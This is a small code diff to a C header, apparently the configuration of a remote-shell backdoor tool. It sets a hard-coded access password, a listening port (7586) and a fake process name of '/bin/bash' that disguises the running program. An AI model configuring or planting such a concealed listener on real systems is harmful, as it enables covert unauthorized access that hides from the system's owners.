@@ -1,7 +1,7 @@
 #ifndef _TSH_H
 #define _TSH_H
 
-char *secret = "replace with your password";
+char *secret = "BD1E980C-AFF4-4924-A239-4451C7713D8C";
 
 #define SERVER_PORT 7586
 #define FAKE_PROC_NAME "/bin/bash"
